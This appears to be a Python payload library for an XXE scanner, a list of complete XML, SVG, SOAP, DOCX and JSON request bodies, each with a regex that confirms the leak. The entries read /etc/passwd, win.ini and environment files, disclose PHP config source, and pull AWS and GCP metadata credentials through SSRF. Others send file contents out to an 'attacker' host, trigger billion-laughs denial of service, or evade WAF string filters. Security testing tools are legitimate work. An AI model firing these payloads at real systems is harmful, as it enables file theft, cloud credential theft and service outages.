"""xxe payload library — generated dev-time by Claude.

Each entry is a full XML/SVG/DOCX/SOAP body that triggers an external-entity
expansion. The `matcher` regex confirms the response leaked a file the
attacker chose (default: /etc/passwd's "root:x:0:0").

The scanner posts each body against every Content-Type in CTS and looks for
the matcher in the response. For variants where the leaked content goes
out-of-band (parameter-entity, OOB), `confirmable=False` — those need an
OOB collector to confirm.

Categories:
  - classic        : Inline DOCTYPE + ENTITY (most parsers refuse this now)
  - parameter      : Parameter entity (% prefix) — bypasses some libxml hardening
  - xinclude       : XInclude directive — alternate include mechanism
  - svg            : SVG-wrapped XXE (image-upload endpoints often vulnerable)
  - soap           : SOAP body XXE (still common in enterprise APIs)
  - docx           : Office Open XML embedded — DOCX/XLSX/PPTX upload flows
  - json-xml       : application/json with embedded XML processing
  - blind-oob      : Out-of-band — leaks file content via DNS or HTTP callback
  - dos            : Billion-laughs / quadratic blowup (causes parser DoS)
  - utf16          : UTF-16 BOM bypass (defeats string-match filter WAFs)
"""

XXE_PAYLOADS = [
  # ── Classic inline entity ──
  {"name": "Classic /etc/passwd", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "matcher": r"root:.*:0:0", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},
  {"name": "Classic /etc/hostname", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', "matcher": r"[a-z0-9-]{2,}", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "HIGH", "cvss": 7.5},
  {"name": "Classic Windows win.ini", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', "matcher": r"\[fonts\]|\[extensions\]|\[mci extensions\]", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},
  {"name": "Classic /proc/self/environ", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>', "matcher": r"PATH=|HOME=|USER=", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},

  # ── Parameter entity ──
  {"name": "Parameter entity passwd", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo>test</foo>', "matcher": r"root:.*:0:0", "category": "parameter", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},
  {"name": "Parameter entity SYSTEM dtd", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker/?x=%file;\'>"> %eval; %exfil;]><foo/>', "matcher": r"root:.*:0:0", "category": "blind-oob", "content_types": ["application/xml","text/xml"], "confirmable": False, "severity": "CRITICAL", "cvss": 9.1},

  # ── XInclude — bypass classic DOCTYPE blocking ──
  {"name": "XInclude /etc/passwd", "body": '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', "matcher": r"root:.*:0:0", "category": "xinclude", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 8.6},
  {"name": "XInclude /etc/hostname", "body": '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>', "matcher": r"[a-z0-9-]{2,}", "category": "xinclude", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "HIGH", "cvss": 7.5},

  # ── SVG-wrapped (image-upload endpoints) ──
  {"name": "SVG XXE passwd", "body": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>', "matcher": r"root:.*:0:0", "category": "svg", "content_types": ["image/svg+xml","application/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},
  {"name": "SVG XXE win.ini", "body": '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>', "matcher": r"\[fonts\]|\[extensions\]", "category": "svg", "content_types": ["image/svg+xml","application/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},

  # ── SOAP envelope ──
  {"name": "SOAP XXE passwd", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><foo>&xxe;</foo></soapenv:Body></soapenv:Envelope>', "matcher": r"root:.*:0:0", "category": "soap", "content_types": ["text/xml","application/soap+xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},
  {"name": "SOAP XInclude passwd", "body": '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xi="http://www.w3.org/2001/XInclude"><soapenv:Body><foo><xi:include parse="text" href="file:///etc/passwd"/></foo></soapenv:Body></soapenv:Envelope>', "matcher": r"root:.*:0:0", "category": "soap", "content_types": ["text/xml","application/soap+xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},

  # ── DOCX-style (Office Open XML) — these are inline placeholders meant
  # to be embedded inside the zipped DOCX. Useful as request-body probes
  # against endpoints that parse loose word/document.xml.
  {"name": "DOCX document.xml XXE", "body": '<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>', "matcher": r"root:.*:0:0", "category": "docx", "content_types": ["application/xml","application/vnd.openxmlformats-officedocument.wordprocessingml.document"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},
  {"name": "XLSX sheet1.xml XXE", "body": '<?xml version="1.0"?><!DOCTYPE worksheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c><v>&xxe;</v></c></row></sheetData></worksheet>', "matcher": r"root:.*:0:0", "category": "docx", "content_types": ["application/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},

  # ── JSON content-type with embedded XML processing ──
  {"name": "JSON-as-XML passwd", "body": '{"xml":"<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><foo>&xxe;</foo>"}', "matcher": r"root:.*:0:0", "category": "json-xml", "content_types": ["application/json"], "confirmable": True, "severity": "HIGH", "cvss": 8.1},

  # ── PHP base64 expect:// + filter:// for source disclosure ──
  {"name": "PHP filter base64 source", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', "matcher": r"[A-Za-z0-9+/=]{60,}", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},
  {"name": "PHP filter base64 config", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../config.php">]><foo>&xxe;</foo>', "matcher": r"[A-Za-z0-9+/=]{60,}", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},

  # ── DoS — billion-laughs / quadratic blowup ──
  {"name": "Billion-laughs (DoS only)", "body": '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>', "matcher": r"lollollollol", "category": "dos", "content_types": ["application/xml","text/xml"], "confirmable": False, "severity": "HIGH", "cvss": 7.5},
  {"name": "Quadratic blowup DoS", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "AAAAAAAAAA AAAAAAAAAA AAAAAAAAAA AAAAAAAAAA AAAAAAAAAA">]><foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>', "matcher": r"A{40}", "category": "dos", "content_types": ["application/xml","text/xml"], "confirmable": False, "severity": "MEDIUM", "cvss": 5.3},

  # ── UTF-16 BOM bypass (defeat string-match WAFs) ──
  {"name": "UTF-16 LE BOM passwd", "body": '﻿<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "matcher": r"root:.*:0:0", "category": "utf16", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "HIGH", "cvss": 8.1},

  # ── Internal network SSRF via XXE ──
  {"name": "XXE SSRF localhost", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80/">]><foo>&xxe;</foo>', "matcher": r"<html|<title|nginx|apache", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "HIGH", "cvss": 8.1},
  {"name": "XXE SSRF AWS IMDS", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>', "matcher": r"AccessKeyId|SecretAccessKey|[A-Z]{20}", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},
  {"name": "XXE SSRF GCP metadata", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]><foo>&xxe;</foo>', "matcher": r"access_token|expires_in", "category": "classic", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.8},

  # ── CDATA / nested entity tricks ──
  {"name": "Nested entity wrap", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY a "&#x26;xxe;"><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&a;</foo>', "matcher": r"root:.*:0:0", "category": "parameter", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},
  {"name": "Hex char-ref encoding", "body": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;:///etc/passwd">]><foo>&xxe;</foo>', "matcher": r"root:.*:0:0", "category": "parameter", "content_types": ["application/xml","text/xml"], "confirmable": True, "severity": "CRITICAL", "cvss": 9.1},

  # ── No-DOCTYPE inline (some XML parsers process via XML-stylesheet) ──
  {"name": "External DTD reference", "body": '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker/evil.dtd"><foo>test</foo>', "matcher": r".+", "category": "blind-oob", "content_types": ["application/xml","text/xml"], "confirmable": False, "severity": "HIGH", "cvss": 7.5},
  {"name": "Stylesheet PI external", "body": '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://attacker/evil.xsl"?><foo>test</foo>', "matcher": r".+", "category": "blind-oob", "content_types": ["application/xml","text/xml"], "confirmable": False, "severity": "MEDIUM", "cvss": 6.5},
]
